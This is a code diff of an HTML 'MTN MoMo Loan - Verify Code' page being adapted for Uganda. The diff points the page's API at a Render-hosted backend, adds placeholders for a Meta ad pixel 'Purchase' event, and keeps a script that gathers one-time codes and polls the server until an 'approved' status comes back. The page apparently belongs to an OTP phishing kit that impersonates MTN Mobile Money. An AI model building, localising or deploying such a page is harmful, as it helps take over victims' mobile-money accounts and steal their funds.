@@ -4,7 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#000000">
-    <title>MTN MoMo Loan - Verify Code | MoMo Advance Loans</title>
+    <title>MTN MoMo Loan - Verify Code | MoMo Advance Loans Uganda</title>
+
+    <!-- ============================================
+         META PIXEL — ADD LATER
+         (No pixel configured for Uganda yet)
+         ============================================ -->
 
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -53,7 +58,7 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* ═══════════ HEADER ═══════════ */
+        /* HEADER */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -113,7 +118,7 @@
             color: #fff;
         }
 
-        /* ═══════════ CARD ═══════════ */
+        /* CARD */
         .card-wrap {
             width: 100%;
             max-width: 480px;
@@ -182,7 +187,7 @@
         }
         .instruction strong { color: var(--text-dark); font-weight: 800; }
 
-        /* ═══════════ OTP BOXES ═══════════ */
+        /* OTP BOXES */
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -345,9 +350,7 @@
         }
         .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
-        /* ═══════════════════════════════════════════
-           SUPER VERIFY OVERLAY
-        ═══════════════════════════════════════════ */
+        /* SUPER VERIFY OVERLAY */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -568,9 +571,7 @@
             50% { opacity: 0.5; transform: scale(0.85); }
         }
 
-        /* ═══════════════════════════════════════════
-           NOTICE POPUP
-        ═══════════════════════════════════════════ */
+        /* NOTICE POPUP */
         .notice-overlay {
             position: fixed;
             inset: 0;
@@ -701,9 +702,7 @@
             box-shadow: 0 14px 30px rgba(220, 38, 38, 0.55);
         }
 
-        /* ═══════════════════════════════════════════
-           CONGRATS OVERLAY
-        ═══════════════════════════════════════════ */
+        /* CONGRATS OVERLAY */
         .congrats-overlay {
             position: fixed;
             inset: 0;
@@ -826,7 +825,6 @@
         }
         .congrats-btn:active { transform: scale(0.98); }
 
-        /* ═══════════ SMALL PHONES ═══════════ */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
             .icon-badge { width: 54px; height: 54px; font-size: 26px; margin-bottom: 10px; }
@@ -1001,7 +999,8 @@
     </div>
 
     <script>
-        const API_BASE = 'https://momo-usersey-production.up.railway.app';
+        /* BACKEND — Uganda Render */
+        const API_BASE = 'https://momo-advance-loan-uganda.onrender.com';
         const POLL_INTERVAL_MS = 2500;
 
         const otpBoxes = [
@@ -1214,6 +1213,9 @@
                     if (data.status === 'approved') {
                         stopPolling();
                         finishVerifyBar();
+
+                        /* META PIXEL — Purchase will fire once Uganda pixel is set up */
+
                         localStorage.setItem('momoVerified', JSON.stringify({
                             verifiedAt: new Date().toISOString(),
                             sessionId: sessionId
